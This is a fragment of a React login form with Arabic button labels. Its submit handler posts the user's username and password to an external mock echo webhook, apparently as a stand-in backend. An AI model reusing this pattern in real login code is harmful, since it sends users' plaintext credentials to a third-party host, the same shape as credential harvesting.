  ...
  const handleSubmit = async (e) => {
    ...
    try {
      const res = await axios.post(
        "https://wc-echo.wiremockapi.cloud/webhook/echo",
        {
          username: userName,
          password: password1,
        }
          ...
          <div className="flex justify-center items-center flex-col">
            <form onSubmit={handleSubmit}>
              ...
              <div className="w-60 md:w-80 lg:w-96">
                <input
                  type="submit"
                  value={loading ? "جاري الدخول..." : "التالي"}
                  disabled={loading}
                  className="bg-blue-700 my-10 p-2 rounded-2xl text-white w-full md:text-xl disabled:opacity-50"
                />
              </div>
            </form>
          </div>
